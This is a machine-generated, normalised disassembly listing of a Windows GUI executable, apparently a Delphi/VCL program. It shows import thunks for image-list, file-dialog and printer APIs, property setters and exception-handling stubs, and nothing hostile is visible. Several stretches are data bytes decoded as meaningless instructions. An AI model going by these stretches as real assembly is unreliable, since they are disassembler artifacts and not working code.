sub_422799
add [ eax ] al
add [ ebx ] dh
leave
call sub_4224e4
retn
sub_42281e
jmp sub_40371c
sub_422823
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a30
call sub_403a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422874
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4229ad
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_4229dc
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4229f0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_422b09
jmp sub_40371c
sub_422bbe
jmp sub_40371c
sub_422c28
jmp sub_40371c
sub_422c5c
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_422be8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_422c74
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41ebac
retn
mov [ eax + 0x30 ] edx
retn
sub_422c8c
retn
sub_422c90
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41ebac
retn
mov [ eax + 0x2c ] edx
retn
sub_422cd0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41ebac
pop ebp
retn 0x4
sub_422ce4
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41ebac
pop ebp
retn 0x4
sub_422ea4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_422eb0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_422f5d
jmp sub_4039d0
sub_422f64
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42304f
jmp sub_40371c
sub_4230bb
jmp sub_4039d0
sub_4231e9
jmp sub_4039d0
sub_4231f0
pop ebp
retn
sub_4232f0
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_423325
jmp sub_4039d0
sub_42332c
pop ebp
retn
sub_423330
sub [ rw-data ] 0x1
retn
sub_423578
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_414170
retn
sub_4235ac
mov eax [ eax + 0x4 ]
call sub_414014
retn
sub_4235dd
jmp sub_4039d0
sub_4235e4
pop ebp
retn
sub_4235e8
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ __import_lookup_table_12(comctl32:ImageList_ReplaceIcon) ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_4236d1
jmp sub_4039d0
sub_4236d8
pop ebp
retn
sub_4236dc
sub [ rw-data ] 0x1
retn
sub_4237a3
jmp sub_4039d0
sub_4237aa
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423dc0
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_4237cc
mov [ rw-data ] sub_4238e4
mov [ rw-data ] sub_423854
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_423ae8
mov [ rw-data ] sub_423bbc
mov [ rw-data ] sub_423c90
retn
sub_423e51
jmp sub_4039d0
sub_423e58
pop ebp
retn
sub_423e5c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423dc0
sub_423e91
jmp sub_4039d0
sub_423e98
pop ebp
retn
sub_423e9c
sub [ rw-data ] 0x1
retn
sub_42412b
add eax 0xffffffd4
jmp sub_424c58
sub_424133
add eax 0xffffffd4
jmp sub_424cb4
sub_424145
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405760
sub_42414f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405774
sub_4242de
jmp sub_4039d0
sub_4242e5
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4244f5
jmp sub_4039d0
sub_4244fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4246b1
jmp sub_4039d0
sub_424716
jmp sub_4039d0
sub_42471d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424809
jmp sub_4039d0
sub_424810
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_424a20
lea eax [ ebp - 0x30 ]
call sub_404050
lea eax [ ebp - 0x20 ]
call sub_404050
retn
sub_424a31
jmp sub_4039d0
j_sub_424a20
jmp sub_424a20
sub_424a38
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424b33
jmp sub_4039d0
sub_424b3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424c37
jmp sub_4039d0
sub_424c3e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424ca7
jmp sub_4039d0
sub_424cae
pop ebx
pop ecx
pop ebp
retn
sub_424d49
jmp sub_4039d0
sub_424d50
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_424d5c
mov eax [ eax + 0x20 ]
retn
sub_424e8b
jmp sub_4039d0
sub_424e92
pop ebp
retn
sub_424e94
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_424ee1
jmp sub_4039d0
sub_424ee8
pop ebp
retn
sub_424eec
sub [ rw-data ] 0x1
retn
sub_42519b
jmp sub_4039d0
sub_4251a2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_425382
jmp sub_4039d0
sub_425389
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4253f5
jmp sub_4039d0
sub_4253fc
pop ecx
pop ecx
pop ebp
retn
sub_425713
jmp sub_4039d0
sub_42571a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425724
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_425264
mov eax [ ebx + 0x20 ]
pop ebx
retn
sub_425738
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_425990
sub_42592b
jmp sub_4039d0
sub_42593c
jmp sub_40371c
sub_42597f
jmp sub_4039d0
sub_425986
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b2d
jmp sub_4039d0
sub_425b6d
jmp sub_4039d0
sub_425b74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425bcc
add eax 0x8
call sub_40d19c
retn
sub_425bd8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4251ac
mov [ rw-data ] eax
sub_425c29
jmp sub_4039d0
sub_425c30
pop ebp
retn
sub_425c34
sub [ rw-data ] 0x1
retn
sub_425f41
jmp sub_4039d0
sub_425f48
pop ebp
retn
sub_425f4c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425c98
sub_42602c
retn
sub_4260a0
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_4260ac
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_4260b8
mov edx [ eax ]
call [ edx ]
retn
sub_4260c0
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_4260ed
jmp sub_4039d0
sub_4260f4
pop ebp
retn
sub_4260f8
sub [ rw-data ] 0x1
retn
sub_4262b7
jmp sub_4039d0
sub_4262be
pop ebp
retn
sub_426673
jmp sub_4039d0
sub_42667a
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426a94
jmp sub_4039d0
sub_426a9b
pop ebp
retn
sub_426aa0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov [ rw-data ] eax
sub_426ae1
jmp sub_4039d0
sub_426ae8
pop ebp
retn
sub_426aec
sub [ rw-data ] 0x1
retn
sub_426b19
jmp sub_4039d0
sub_426b20
pop ebp
retn
sub_426b24
sub [ rw-data ] 0x1
retn
sub_426b51
jmp sub_4039d0
sub_426b58
pop ebp
retn
sub_426b5c
sub [ rw-data ] 0x1
retn
sub_426b89
jmp sub_4039d0
sub_426b90
pop ebp
retn
sub_426b94
sub [ rw-data ] 0x1
retn
sub_426bc1
jmp sub_4039d0
sub_426bc8
pop ebp
retn
sub_426bcc
sub [ rw-data ] 0x1
retn
sub_426bf9
jmp sub_4039d0
sub_426c00
pop ebp
retn
sub_426c04
sub [ rw-data ] 0x1
retn
sub_426c65
jmp sub_4039d0
sub_426c6c
pop ebp
retn
sub_426c70
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
FindTextA
jmp [ __import_lookup_table_14(comdlg32:FindTextA) ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
ChooseFontA
jmp [ ChooseFontA@IAT ]
PrintDlgA
jmp [ __import_lookup_table_14(comdlg32:PrintDlgA) ]
sub_426cd5
jmp sub_4039d0
sub_426cdc
pop ebp
retn
sub_426ce0
sub [ rw-data ] 0x1
retn
sub_426d0d
jmp sub_4039d0
sub_426d14
pop ebp
retn
sub_426d18
sub [ rw-data ] 0x1
retn
sub_4271bc
jmp r-xdata
sub_4271be
0x44ffe9ff 0x4288
sub_42847e
jmp sub_40371c
sub_428483
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4284a0
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4284a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403490
pop esi
retn
sub_4284c0
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403490
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4284d8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_428581
jmp sub_4039d0
sub_4285af
jmp sub_4039d0
sub_4285b6
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4285c0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4285d4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42886c
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_42888c
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4288ac
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4288fe
jmp sub_4039d0
sub_428905
pop ecx
pop ebp
retn
sub_428c4d
jmp sub_4039d0
sub_428c54
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428d8d
jmp sub_4039d0
sub_428d94
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428e53
jmp sub_4039d0
sub_428e5a
pop ebx
mov esp ebp
pop ebp
retn
sub_428f0c
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_428f8c
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_428fa8
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_42899c
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4290bc
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_42915f
jmp sub_40371c
sub_429319
jmp sub_4039d0
sub_429320
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42932c
push esi
mov esi eax
mov eax [ esi + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4293d9
jmp sub_4039d0
sub_4293e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4294e0
jmp sub_4039d0
sub_42955c
jmp sub_4039d0
sub_429563
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4295ee
jmp sub_4039d0
sub_429717
jmp sub_4039d0
sub_42971e
pop ecx
pop ebp
retn 0x8
sub_429b10
jmp sub_40371c
sub_429e38
call sub_403294
retn
sub_42a1c0
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42a1d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_4042c0
pop esi
pop ebx
retn
sub_42a1f0
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42a208
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42a23c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_4042c0
pop esi
pop ebx
retn
sub_42a258
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42a208
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42a352
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42a63a
jmp sub_4039d0
sub_42a641
pop ebp
retn
sub_42a85a
jmp sub_40371c
sub_42a913
jmp sub_4039d0
sub_42a91a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a920
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42a894
sub_42a930
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42a894
sub_42a940
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42a894
pop ebp
retn 0x8
sub_42a958
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42ac9c
jmp sub_4039d0
sub_42aca3
pop ebp
retn
sub_42aca8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d54
mov eax [ r-xdata ]
call sub_4139ac
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
sub_42acfd
jmp sub_4039d0
sub_42ad04
pop ebp
retn
sub_42ad08
sub [ rw-data ] 0x1
retn
sub_42ad41
jmp sub_4039d0
sub_42ad48
pop ebp
retn
sub_42ad4c
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42adc8
retn
sub_42adc9
jmp sub_4039d0
j_sub_42adc8
jmp sub_42adc8
sub_42add0
pop ebp
retn
sub_42add4
sub [ rw-data ] 0x1
retn
sub_42addc
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403294
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42aea0
jmp sub_4039d0
sub_42aea7
pop ebp
retn
sub_42aeac
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42adf8
call sub_403da0
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402ca4
sub_42aef9
jmp sub_4039d0
sub_42af00
pop ebp
retn
sub_42af04
sub [ rw-data ] 0x1
retn
sub_42af60
jmp sub_4039d0
sub_42af67
pop ebp
retn
sub_42af6c
sub [ rw-data ] 0x1
retn
sub_42afc8
jmp sub_4039d0
sub_42afcf
pop ebp
retn
sub_42afd4
sub [ rw-data ] 0x1
retn
sub_42b035
jmp sub_4039d0
sub_42b03c
pop ebp
retn
sub_42b040
sub [ rw-data ] 0x1
retn
sub_42b08c
jmp sub_4039d0
sub_42b093
pop ebp
retn
sub_42b098
sub [ rw-data ] 0x1
retn
sub_42b0c5
jmp sub_4039d0
sub_42b0cc
pop ebp
retn
sub_42b0d0
sub [ rw-data ] 0x1
retn
sub_42b178
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bde0
mov [ rw-data ] eax
sub_42b1ad
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42b1c4
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42b247
jmp sub_4039d0
sub_42b24e
pop ebp
retn
sub_42b250
sub [ rw-data ] 0x1
retn
sub_42b2bf
jmp [ edi ]
sub_42b560
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42b578
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42b5bc
push ebx
mov ebx eax
mov eax ebx
call sub_42bbfc
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42bbeb
jmp sub_4039d0
sub_42bbfc
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_426a24
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42b58c
sub_42bc53
jmp sub_4039d0
sub_42bc5a
pop ebp
retn
sub_42bc5c
sub [ rw-data ] 0x1
retn
sub_42e684
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_42e742
inc ecx
add [ eax ] bl
pop edx
inc ecx
add [ eax ] ch
0x5a4c0042 0x41
sub_42e82a
jmp sub_4039d0
sub_42e831
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e91c
jmp sub_4039d0
sub_42e923
pop ebx
pop ecx
pop ebp
retn
sub_42ea17
jmp sub_4039d0
sub_42ea1e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ea9b
jmp sub_4039d0
sub_42eaa2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ebf8
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_437788
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_42ec48
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
pop ebx
retn
sub_42ed7c
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_43b50c
sub_42edb0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42edb8
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42edc0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42edec
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_438978
sub_42ef44
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_42ef64
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_43b50c
sub_42f22f
jmp sub_40371c
sub_42f234
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e4c
call sub_403a84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f4c0
jmp sub_4039d0
sub_42f4c7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f4d0
push ebx
mov ebx eax
mov eax ebx
call sub_4373b8
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42f59d
jmp sub_4039d0
sub_42f5a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f5b0
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42f62c
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42f746
jmp sub_4039d0
sub_42f790
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_42f81b
jmp sub_4039d0
sub_42f822
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f854
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_42f860
mov [ eax + 0x210 ] edx
retn
sub_42f8b1
jmp sub_4039d0
sub_42f8b8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f980
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_43b50c
sub_42f9d4
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_42f9e9
mov eax [ eax + 0x238 ]
retn
sub_42f9e9
push 0x0
xor ecx ecx
mov edx 0x154
call sub_438978
retn
sub_42fd28
jmp sub_4039d0
sub_42fd2f
pop ebx
mov esp ebp
pop ebp
retn
sub_4300ec
jmp sub_4039d0
sub_4300f3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4302b1
jmp sub_4039d0
sub_4302b8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4302c4
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4304a8
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4304b4
mov eax [ r-xdata ]
retn
sub_4306e5
jmp sub_4039d0
sub_4306f4
retn
sub_4307aa
jmp sub_4039d0
sub_430854
mov eax [ r-xdata ]
retn
sub_43085c
xor eax eax
retn
sub_430880
retn
sub_430998
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43b50c
sub_430a10
push ebx
mov ebx eax
mov eax ebx
call sub_44e0a8
test eax eax
je r-xdata
mov eax ebx
call sub_438d00
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_430a34
xor eax eax
retn
sub_430afb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5be1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_430b14
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403490
sub_430c05
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_430c0e
jmp sub_4039d0
j_sub_430c05
jmp sub_430c05
sub_430c15
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430dc0
push ebx
mov ebx eax
mov eax ebx
call sub_4373b8
mov eax ebx
call sub_438d00
pop ebx
retn
sub_430dd4
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_430de0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43b50c
sub_430df4
test dl dl
je r-xdata
xor edx edx
call sub_430e08
retn
mov dl 0x1
call sub_430e08
retn
sub_430ee4
push ebx
mov ebx eax
mov eax ebx
call sub_43c558
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_430ef8
call sub_43b50c
retn
sub_430f8e
jmp sub_4039d0
sub_430f95
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430f9c
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_431337
jmp sub_4039d0
sub_43133e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_431348
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_431200
retn
sub_4313b4
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_431200
retn
sub_4313cc
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_431200
retn
sub_4313e0
push ebx
mov ebx eax
mov eax ebx
call sub_4373b8
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_431404
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43153c
call sub_431424
retn
sub_431544
call sub_431424
retn
sub_431574
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4315a1
jmp sub_4039d0
sub_4315a8
pop ebp
retn
sub_4315ac
sub [ rw-data ] 0x1
retn
sub_431709
jmp sub_4039d0
sub_431710
pop ebp
retn
sub_431714
sub [ rw-data ] 0x1
retn
sub_43171c
cmpsb [ fs : esi ] [ edi ]
inc edi
add cl dh
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_431f94
sub_43172d
add eax 0xffffffe0
jmp sub_431d14
sub_431735
add eax 0xffffffe0
jmp sub_431d7c
sub_43173d
add eax 0xffffffe0
jmp sub_431e90
sub_431745
add eax 0xffffffe0
jmp sub_431f04
sub_43174d
add eax 0xffffffe0
jmp sub_4319c0
sub_431755
add eax 0xffffffe0
jmp sub_4319d4
sub_43175d
add eax 0xffffffe0
jmp sub_431a4c
sub_431765
add eax 0xffffffe0
jmp sub_431af0
sub_43176d
add eax 0xffffffe0
jmp sub_431af4
sub_431775
add eax 0xffffffe0
jmp sub_431b7c
sub_43177d
add eax 0xffffffe0
jmp sub_431cc4
sub_431785
add eax 0xffffffe0
jmp sub_431cc8
sub_43178d
add eax 0xffffffe0
jmp sub_431ce4
sub_43179f
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405760
sub_4317a9
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405774
sub_43197d
jmp sub_4039d0
sub_431984
